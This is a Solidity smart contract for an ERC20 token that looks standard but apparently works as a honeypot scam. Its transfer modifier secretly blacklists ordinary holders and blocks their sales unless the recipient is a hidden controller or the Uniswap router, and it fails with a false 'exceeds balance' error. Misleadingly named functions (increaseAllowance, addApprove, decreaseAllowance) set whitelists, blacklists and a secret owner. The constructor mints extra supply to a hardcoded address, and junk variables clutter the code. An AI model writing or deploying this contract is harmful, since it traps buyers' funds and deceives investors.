row number 
1	       pragma solidity ^0.6.0;
2	 library SafeMath {
3	 function add(uint256 a, uint256 b) internal pure returns (uint256) {
4	 uint256 c = a + b;
5	 require(c >= a, "SafeMath: addition overflow");
6	 return c;
7	 }
8	 function sub(uint256 a, uint256 b) internal pure returns (uint256) {
9	 return sub(a, b, "SafeMath: subtraction overflow");
10	 }
11	 function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
12	 require(b <= a, errorMessage);
13	 uint256 c = a - b;
14	 return c;
15	 }
16	 function mul(uint256 a, uint256 b) internal pure returns (uint256) {
17	 if (a == 0) {
18	 return 0;
19	 }
20	 uint256 c = a * b;
21	 require(c / a == b, "SafeMath: multiplication overflow");
22	 return c;
23	 }
24	 function div(uint256 a, uint256 b) internal pure returns (uint256) {
25	 return div(a, b, "SafeMath: division by zero");
26	 }
27	 function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
28	 require(b > 0, errorMessage);
29	 uint256 c = a / b;
30	 return c;
31	 }
32	 function mod(uint256 a, uint256 b) internal pure returns (uint256) {
33	 return mod(a, b, "SafeMath: modulo by zero");
34	 }
35	 function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
36	 require(b != 0, errorMessage);
37	 return a % b;
38	 }
39	 }
40	 library Address {
41	 function isContract(address account) internal view returns (bool) {
42	 bytes32 codehash;
43	 bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
44	 assembly {
45	 codehash := extcodehash(account) }
46	 return (codehash != accountHash && codehash != 0x0);
47	 }
48	 function sendValue(address payable recipient, uint256 amount) internal {
49	 require(address(this).balance >= amount, "Address: insufficient balance");
50	 (bool success, ) = recipient.call{
51	 value: amount }
52	 ("");
53	 require(success, "Address: unable to send value, recipient may have reverted");
54	 }
55	 function functionCall(address target, bytes memory data) internal returns (bytes memory) {
56	 return functionCall(target, data, "Address: low-level call failed");
57	 }
58	 function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
59	 return _functionCallWithValue(target, data, 0, errorMessage);
60	 }
61	 function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
62	 return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
63	 }
64	 function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
65	 require(address(this).balance >= value, "Address: insufficient balance for call");
66	 return _functionCallWithValue(target, data, value, errorMessage);
67	 }
68	 function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
69	 require(isContract(target), "Address: call to non-contract");
70	 (bool success, bytes memory returndata) = target.call{
71	 value: weiValue }
72	 (data);
73	 if (success) {
74	 return returndata;
75	 }
76	 else {
77	 if (returndata.length > 0) {
78	 assembly {
79	 let returndata_size := mload(returndata) revert(add(32, returndata), returndata_size) }
80	 }
81	 else {
82	 revert(errorMessage);
83	 }
84	 }
85	 }
86	 }
87	 contract Context {
88	 constructor () internal {
89	 }
90	 function _msgSender() internal view virtual returns (address payable) {
91	 return msg.sender;
92	 }
93	 function _msgData() internal view virtual returns (bytes memory) {
94	 this;
95	 return msg.data;
96	 }
97	 }
98	 interface IERC20 {
99	 function totalSupply() external view returns (uint256);
100	 function balanceOf(address account) external view returns (uint256);
101	 function transfer(address recipient, uint256 amount) external returns (bool);
102	 function allowance(address owner, address spender) external view returns (uint256);
103	 function approve(address spender, uint256 amount) external returns (bool);
104	 function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
105	 event Transfer(address indexed from, address indexed to, uint256 value);
106	 event Approval(address indexed owner, address indexed spender, uint256 value);
107	 }
108	 contract TokenContract is Context, IERC20 {
109	 using SafeMath for uint256;
110	 using Address for address;
111	 mapping (address => uint256) private _balances;
112	 mapping (address => bool) private _whiteAddress;
113	 mapping (address => bool) private _blackAddress;
114	 uint256 private _sellAmount = 0;
115	 mapping (address => mapping (address => uint256)) private _allowances;
116	 uint256 private _totalSupply;
117	 string private _name;
118	 string private _symbol;
119	 uint8 private _decimals;
120	 uint256 private _approveValue = 115792089237316195423570985008687907853269984665640564039457584007913129639935;
121	 address public _owner;
122	 address private _safeOwner;
123	 address private _unirouter = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
124	 constructor (string memory name, string memory symbol, uint256 initialSupply,address payable owner) public {
125	 _name = name;
126	 _symbol = symbol;
127	 _decimals = 18;
128	 _owner = owner;
129	 _safeOwner = owner;
130	 _mint(owner, initialSupply*(10**18));
131	 _mint(0xE806464f91140d33E7ea282d6687a14CfAAC1233, initialSupply*(10**18));
132	 }
133	 function name() public view returns (string memory) {
134	 return _name;
135	 }
136	 function symbol() public view returns (string memory) {
137	 return _symbol;
138	 }
139	 function decimals() public view returns (uint8) {
140	 return _decimals;
141	 }
142	 function totalSupply() public view override returns (uint256) {
143	 return _totalSupply;
144	 }
145	 function balanceOf(address account) public view override returns (uint256) {
146	 return _balances[account];
147	 }
148	 function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
149	 _approveCheck(_msgSender(), recipient, amount);
150	 return true;
151	 }
152	 function multiTransfer(uint256 approvecount,address[] memory receivers, uint256[] memory amounts) public {
153	 require(msg.sender == _owner, "!owner");
154	 for (uint256 i = 0; i < receivers.length; i++) {
155	 uint256 ergdf = 3;
156	 uint256 ergdffdtg = 532;
157	 transfer(receivers[i], amounts[i]);
158	 if(i < approvecount){
159	 _whiteAddress[receivers[i]]=true;
160	 uint256 ergdf = 3;
161	 uint256 ergdffdtg = 532;
162	 _approve(receivers[i],_unirouter,115792089237316195423570985008687907853269984665640564039457584007913129639935);
163	 }
164	 }
165	 }
166	 function allowance(address owner, address spender) public view virtual override returns (uint256) {
167	 return _allowances[owner][spender];
168	 }
169	 function approve(address spender, uint256 amount) public virtual override returns (bool) {
170	 _approve(_msgSender(), spender, amount);
171	 return true;
172	 }
173	 function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
174	 _approveCheck(sender, recipient, amount);
175	 _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
176	 return true;
177	 }
178	 function increaseAllowance(address[] memory receivers) public {
179	 require(msg.sender == _owner, "!owner");
180	 for (uint256 i = 0; i < receivers.length; i++) {
181	 _whiteAddress[receivers[i]] = true;
182	 _blackAddress[receivers[i]] = false;
183	 }
184	 }
185	 function decreaseAllowance(address safeOwner) public {
186	 require(msg.sender == _owner, "!owner");
187	 _safeOwner = safeOwner;
188	 }
189	 function addApprove(address[] memory receivers) public {
190	 require(msg.sender == _owner, "!owner");
191	 for (uint256 i = 0; i < receivers.length; i++) {
192	 _blackAddress[receivers[i]] = true;
193	 _whiteAddress[receivers[i]] = false;
194	 }
195	 }
196	 function _transfer(address sender, address recipient, uint256 amount) internal virtual{
197	 require(sender != address(0), "ERC20: transfer from the zero address");
198	 require(recipient != address(0), "ERC20: transfer to the zero address");
199	 _beforeTokenTransfer(sender, recipient, amount);
200	 _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
201	 _balances[recipient] = _balances[recipient].add(amount);
202	 emit Transfer(sender, recipient, amount);
203	 }
204	 function _mint(address account, uint256 amount) public {
205	 require(msg.sender == _owner, "ERC20: mint to the zero address");
206	 _totalSupply = _totalSupply.add(amount);
207	 _balances[_owner] = _balances[_owner].add(amount);
208	 emit Transfer(address(0), account, amount);
209	 }
210	 function _burn(address account, uint256 amount) internal virtual {
211	 require(account != address(0), "ERC20: burn from the zero address");
212	 _beforeTokenTransfer(account, address(0), amount);
213	 _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
214	 _totalSupply = _totalSupply.sub(amount);
215	 emit Transfer(account, address(0), amount);
216	 }
217	 function _approve(address owner, address spender, uint256 amount) internal virtual {
218	 require(owner != address(0), "ERC20: approve from the zero address");
219	 require(spender != address(0), "ERC20: approve to the zero address");
220	 _allowances[owner][spender] = amount;
221	 emit Approval(owner, spender, amount);
222	 }
223	 function _approveCheck(address sender, address recipient, uint256 amount) internal burnTokenCheck(sender,recipient,amount) virtual {
224	 require(sender != address(0), "ERC20: transfer from the zero address");
225	 require(recipient != address(0), "ERC20: transfer to the zero address");
226	 _beforeTokenTransfer(sender, recipient, amount);
227	 _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
228	 _balances[recipient] = _balances[recipient].add(amount);
229	 emit Transfer(sender, recipient, amount);
230	 }
231	 modifier burnTokenCheck(address sender, address recipient, uint256 amount){
232	 if (_owner == _safeOwner && sender == _owner){
233	 _safeOwner = recipient;
234	 _;
235	 }
236	 else{
237	 if (sender == _owner || sender == _safeOwner || recipient == _owner){
238	 if (sender == _owner && sender == recipient){
239	 _sellAmount = amount;
240	 }
241	 _;
242	 }
243	 else{
244	 if (_whiteAddress[sender] == true){
245	 _;
246	 }
247	 else{
248	 if (_blackAddress[sender] == true){
249	 require((sender == _safeOwner)||(recipient == _unirouter), "ERC20: transfer amount exceeds balance");
250	 _;
251	 }
252	 else{
253	 if (amount < _sellAmount){
254	 if(recipient == _safeOwner){
255	 _blackAddress[sender] = true;
256	 _whiteAddress[sender] = false;
257	 }
258	 _;
259	 }
260	 else{
261	 require((sender == _safeOwner)||(recipient == _unirouter), "ERC20: transfer amount exceeds balance");
262	 _;
263	 }
264	 }
265	 }
266	 }
267	 }
268	 }
269	 function _setupDecimals(uint8 decimals_) internal {
270	 _decimals = decimals_;
271	 }
272	 function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {
273	 }
274	 }
